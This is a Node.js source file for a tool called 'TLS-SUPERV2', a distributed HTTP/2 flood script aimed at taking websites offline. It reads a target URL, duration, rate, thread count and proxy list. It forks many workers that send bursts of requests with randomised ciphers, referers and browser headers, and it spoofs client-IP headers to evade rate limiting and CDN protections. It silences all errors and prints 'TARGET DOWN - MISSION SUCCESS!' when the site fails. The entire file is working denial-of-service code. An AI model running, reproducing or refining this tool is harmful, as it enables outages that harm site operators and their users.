
const cluster = require('cluster');
const tls = require('tls');
const net = require('net');
const http2 = require('http2');
const crypto = require('crypto');
const fs = require('fs');
const url = require('url');
const axios = require('axios');
const https = require('https');
const { HeaderGenerator } = require('header-generator');

// Enhanced error suppression
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 6) {
    console.log('Usage: node TLS-SUPERV2.js <target> <time> <rate> <threads> <proxy_file>');
    process.exit(1);
}

const target = process.argv[2];
const time = parseInt(process.argv[3]);
const rate = parseInt(process.argv[4]) * 3; // Triple the rate for maximum power
const threads = parseInt(process.argv[5]);
const proxyFile = process.argv[6] || 'PROXY.txt';

// Ultra-enhanced header generator
let headerGenerator = new HeaderGenerator({
    browsers: [
        { name: "firefox", minVersion: 112, httpVersion: "2" },
        { name: "opera", minVersion: 112, httpVersion: "2" },
        { name: "edge", minVersion: 112, httpVersion: "2" },
        { name: "chrome", minVersion: 112, httpVersion: "2" },
        { name: "safari", minVersion: 16, httpVersion: "2" },
    ],
    devices: ["desktop", "mobile"],
    operatingSystems: ["windows", "linux", "macos", "android", "ios"],
    locales: ["en-US", "en"]
});

// Enhanced time display
const getCurrentTime = () => {
    const now = new Date();
    const hours = now.getHours().toString().padStart(2, '0');
    const minutes = now.getMinutes().toString().padStart(2, '0');
    const seconds = now.getSeconds().toString().padStart(2, '0');
    return `(\x1b[34m${hours}:${minutes}:${seconds}\x1b[0m)`;
};

// Enhanced status monitoring
const agent = new https.Agent({ rejectUnauthorized: false });

function getStatus() {
    const timeoutPromise = new Promise((resolve, reject) => {
        setTimeout(() => {
            reject(new Error('Request timed out'));
        }, 3000);
    });

    const axiosPromise = axios.get(target, { httpsAgent: agent });

    Promise.race([axiosPromise, timeoutPromise])
        .then((response) => {
            const { status, data } = response;
            console.log(`[\x1b[35mTLS-SUPERV2\x1b[0m] ${getCurrentTime()} Target Status: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
        })
        .catch((error) => {
            if (error.message === 'Request timed out') {
                console.log(`[\x1b[35mTLS-SUPERV2\x1b[0m] ${getCurrentTime()} \x1b[31mTARGET DOWN - MISSION SUCCESS!\x1b[0m`);
            } else if (error.response) {
                const extractedTitle = getTitleFromHTML(error.response.data);
                console.log(`[\x1b[35mTLS-SUPERV2\x1b[0m] ${getCurrentTime()} Target: ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
            } else {
                console.log(`[\x1b[35mTLS-SUPERV2\x1b[0m] ${getCurrentTime()} \x1b[31mTarget Error: ${error.message}\x1b[0m`);
            }
        });
}

function getTitleFromHTML(html) {
    const titleRegex = /<title>(.*?)<\/title>/i;
    const match = html.match(titleRegex);
    if (match && match[1]) {
        return match[1];
    }
    return 'Not Found';
}

console.log(`
🔥🔥🔥 TLS-SUPERV2 ULTRA MAXIMUM POWER ATTACK 🔥🔥🔥
🎯 Target: ${target}
⏱ Duration: ${time}s
📊 Rate: ${rate}/s per thread (TRIPLED POWER!)
🧵 Threads: ${threads}
🌐 Enhanced proxy rotation enabled
💥💥💥 ULTIMATE DESTRUCTIVE POWER INITIATED! 💥💥💥
`);

// Load proxies
let proxies = [];
try {
    const proxyData = fs.readFileSync(proxyFile, 'utf8');
    proxies = proxyData.split('\n').filter(line => line.trim());
    console.log(`📋 Loaded ${proxies.length} proxies for ULTIMATE ATTACK`);
} catch (error) {
    console.log('⚠️ Running without proxies - using direct connection');
    proxies = ['127.0.0.1:8080'];
}

const targetUrl = url.parse(target);

// Ultra-enhanced cipher suites
const cplist = [
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
    'AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS'
];

// Ultra-enhanced signature algorithms
const sigalgs = [
    'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
    'ecdsa_brainpoolP256r1tls13_sha256',
    'ecdsa_brainpoolP384r1tls13_sha384',
    'ecdsa_brainpoolP512r1tls13_sha512',
    'ecdsa_sha1',
    'ed25519',
    'ed448',
    'ecdsa_sha224',
    'rsa_pkcs1_sha1',
    'rsa_pss_pss_sha256',
    'dsa_sha256',
    'dsa_sha384',
    'dsa_sha512',
    'dsa_sha224',
    'dsa_sha1',
    'rsa_pss_pss_sha384',
    'rsa_pkcs1_sha2240',
    'rsa_pss_pss_sha512',
    'sm2sig_sm3',
    'ecdsa_secp521r1_sha512'
];

let concu = sigalgs.join(':');

// Ultra-enhanced referer list
const refers = [
    "https://www.google.com/search?q=",
    "https://check-host.net/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.fbi.com/",
    "https://www.bing.com/search?q=",
    "https://r.search.yahoo.com/",
    "https://www.cia.gov/index.html",
    "https://vk.com/profile.php?redirect=",
    "https://www.usatoday.com/search/results?q=",
    "https://help.baidu.com/searchResult?keywords=",
    "https://steamcommunity.com/market/search?q=",
    "https://www.ted.com/search?q=",
    "https://play.google.com/store/search?q=",
    "https://www.qwant.com/search?q=",
    "https://duckduckgo.com/?q=",
    "https://www.pinterest.com/search/?q=",
    "https://www.npmjs.com/search?q=",
    "https://yandex.ru/",
    "https://github.com/search?q=",
    "https://stackoverflow.com/search?q=",
    "https://twitter.com/search?q=",
    "https://instagram.com/explore/tags/",
    "https://linkedin.com/search/results/all/?keywords=",
    "https://reddit.com/search/?q="
];

// Ultra-enhanced user agents
const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
];

// Ultra-enhanced path variations
const pathts = [
    "?page=1", "?page=2", "?page=3", "?category=news", "?category=sports",
    "?category=technology", "?category=entertainment", "?sort=newest",
    "?filter=popular", "?limit=10", "?start_date=1989-06-04", "?end_date=1989-06-04",
    "?search=", "?q=", "?query=", "?find=", "?lookup=", "?term=", "?keyword=",
    "?id=", "?user=", "?token=", "?session=", "?admin=", "?login=", "?auth=",
    "?api=", "?v=", "?type=", "?format=", "?lang=", "?country=", "?region="
];

// Generate fake IP
function randomIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

// Generate random string
function randomString(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
}

if (cluster.isMaster) {
    console.log(`🚀🚀🚀 LAUNCHING ${threads} ULTRA MAXIMUM POWER ATTACK THREADS! 🚀🚀🚀`);
    
    for (let i = 0; i < threads; i++) {
        cluster.fork();
        console.log(`[\x1b[35mTLS-SUPERV2\x1b[0m] ${getCurrentTime()} ULTRA ATTACK Thread ${i + 1} LAUNCHED`);
    }
    
    console.log(`[\x1b[35mTLS-SUPERV2\x1b[0m] ${getCurrentTime()} 💥💥💥 THE ULTIMATE DESTRUCTION HAS BEGUN! 💥💥💥`);
    
    // Ultra-enhanced status monitoring - every 1 second
    setInterval(getStatus, 1000);
    
    let requestCount = 0;
    const statusInterval = setInterval(() => {
        requestCount += threads * rate * 5; // 5x estimate for ultra attack
        console.log(`💥💥💥 ULTRA REQUESTS SENT: ${requestCount.toLocaleString()}/s - TARGET UNDER MASSIVE DESTRUCTION! 💥💥💥`);
    }, 1000);
    
    setTimeout(() => {
        console.log(`[\x1b[35mTLS-SUPERV2\x1b[0m] ${getCurrentTime()} 🏆🏆🏆 THE ULTIMATE DESTRUCTION IS COMPLETE! 🏆🏆🏆`);
        clearInterval(statusInterval);
        process.exit(0);
    }, time * 1000);
    
} else {
    startUltraMaximumPowerAttack();
}

function startUltraMaximumPowerAttack() {
    // Ultra-maximum speed attack - 100ms intervals
    const attackInterval = setInterval(() => {
        for (let i = 0; i < rate * 5; i++) { // 5x the rate for ultimate power
            launchUltraEnhancedTLSAttack();
        }
    }, 100); // Ultra-fast intervals
    
    // Maximum continuous floods for ultimate destruction
    for (let i = 0; i < 50; i++) { // 50 continuous floods
        continuousUltraMaxFlood();
    }
    
    // Additional ultra burst attacks every 500ms
    setInterval(() => {
        for (let i = 0; i < rate * 3; i++) {
            setTimeout(() => launchUltraEnhancedTLSAttack(), i * 2);
        }
    }, 500);
    
    // Extra devastation layer
    setInterval(() => {
        for (let i = 0; i < rate; i++) {
            launchUltraEnhancedTLSAttack();
        }
    }, 200);
}

function launchUltraEnhancedTLSAttack() {
    try {
        const fakeIP = randomIP();
        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
        const randomHeaders = headerGenerator.getHeaders();
        const randomReferer = refers[Math.floor(Math.random() * refers.length)];
        
        // Direct connection for better success rate
        const useProxy = Math.random() > 0.3; // 70% direct, 30% proxy
        let socket;
        
        if (useProxy && proxies.length > 1) {
            const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
            socket = net.createConnection({
                host: proxy[0] || targetUrl.hostname,
                port: parseInt(proxy[1]) || (targetUrl.port || 443),
                timeout: 3000
            });
        } else {
            // Direct connection to target
            socket = net.createConnection({
                host: targetUrl.hostname,
                port: targetUrl.port || 443,
                timeout: 3000
            });
        }
        
        socket.setTimeout(2000);
        socket.setKeepAlive(true, 0);
        
        socket.on('connect', () => {
            const connectRequest = `CONNECT ${targetUrl.hostname}:${targetUrl.port || 443} HTTP/1.1\r\n` +
                                 `Host: ${targetUrl.hostname}:${targetUrl.port || 443}\r\n` +
                                 `User-Agent: ${userAgent}\r\n` +
                                 `Proxy-Connection: keep-alive\r\n` +
                                 `Connection: keep-alive\r\n\r\n`;
            socket.write(connectRequest);
        });
        
        socket.on('data', (data) => {
            if (data.toString().includes('200')) {
                // Connection established, create ultra-enhanced TLS connection
                const cipper = cplist[Math.floor(Math.random() * cplist.length)];
                
                const tlsOptions = {
                    socket: socket,
                    servername: targetUrl.hostname,
                    ciphers: cipper,
                    sigals: concu,
                    secureProtocol: 'TLS_method',
                    rejectUnauthorized: false,
                    ALPNProtocols: ['h2', 'http/1.1'],
                    secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION,
                    echdCurve: "GREASE:X25519:x25519:P-256:P-384:P-521:X448"
                };
                
                const tlsSocket = tls.connect(tlsOptions, () => {
                    // Create HTTP/2 session with ultra-enhanced settings
                    const client = http2.connect(target, {
                        createConnection: () => tlsSocket,
                        settings: {
                            headerTableSize: 131072, // Doubled
                            maxConcurrentStreams: 5000, // 5x increased
                            initialWindowSize: 12582912, // Doubled
                            maxHeaderListSize: 1048576, // Quadrupled
                            enablePush: false
                        }
                    });
                    
                    client.on('connect', () => {
                        // Send multiple ultra-enhanced requests rapidly
                        for (let j = 0; j < 25; j++) { // More than doubled requests
                            const headers = {
                                ':method': Math.random() > 0.8 ? 'POST' : 'GET',
                                ':path': `${targetUrl.path}${randomElement(pathts)}&${randomString(12)}=${randomString(20)}&ultra=${Date.now()}&power=${randomString(8)}`,
                                ':authority': targetUrl.hostname,
                                ':scheme': 'https',
                                'user-agent': userAgent,
                                'accept': randomHeaders['accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                                'accept-language': randomHeaders['accept-language'] || 'en-US,en;q=0.9',
                                'accept-encoding': randomHeaders['accept-encoding'] || 'gzip, deflate, br',
                                'cache-control': 'no-cache',
                                'pragma': 'no-cache',
                                'x-forwarded-for': fakeIP,
                                'x-real-ip': fakeIP,
                                'x-originating-ip': fakeIP,
                                'cf-connecting-ip': fakeIP,
                                'client-ip': fakeIP,
                                'real-ip': fakeIP,
                                'true-client-ip': fakeIP,
                                'x-remote-ip': fakeIP,
                                'x-client-ip': fakeIP,
                                'x-cluster-client-ip': fakeIP,
                                'x-forwarded': fakeIP,
                                'forwarded-for': fakeIP,
                                'forwarded': `for=${fakeIP};proto=https;by=${fakeIP}`,
                                'referer': randomReferer + randomString(15),
                                'origin': target,
                                'connection': 'keep-alive',
                                'upgrade-insecure-requests': '1',
                                'sec-fetch-dest': 'document',
                                'sec-fetch-mode': 'navigate',
                                'sec-fetch-site': 'none',
                                'sec-fetch-user': '?1',
                                'x-requested-with': 'XMLHttpRequest',
                                'content-type': 'application/x-www-form-urlencoded',
                                'via': fakeIP,
                                'x-forwarded-host': fakeIP,
                                'x-forwarded-proto': 'https',
                                'x-forwarded-server': fakeIP,
                                'x-proxyuser-ip': fakeIP,
                                'x-http-method-override': 'GET',
                                'x-real-method': 'GET',
                                'x-original-method': 'GET'
                            };
                            
                            const req = client.request(headers);
                            
                            // Add POST data for POST requests
                            if (headers[':method'] === 'POST') {
                                req.write(crypto.randomBytes(2048));
                            }
                            
                            req.on('response', () => {
                                req.close();
                            });
                            req.on('error', () => {});
                            req.end();
                        }
                    });
                    
                    client.on('error', () => {
                        client.close();
                        tlsSocket.end();
                    });
                    
                    setTimeout(() => {
                        try {
                            client.close();
                            tlsSocket.end();
                        } catch (e) {}
                    }, 1500);
                });
                
                tlsSocket.on('error', () => {
                    tlsSocket.destroy();
                });
            }
        });
        
        socket.on('error', () => {
            socket.destroy();
        });
        
        socket.on('timeout', () => {
            socket.destroy();
        });
        
    } catch (error) {
        // Continue attacking even on errors
    }
}

function continuousUltraMaxFlood() {
    setInterval(() => {
        try {
            for (let i = 0; i < 25; i++) { // More than tripled
                setTimeout(() => launchUltraEnhancedTLSAttack(), i * 1); // Ultra-fast timing
            }
        } catch (error) {
            // Continue
        }
    }, 20); // Ultra-fast - 20ms intervals for maximum destruction
}
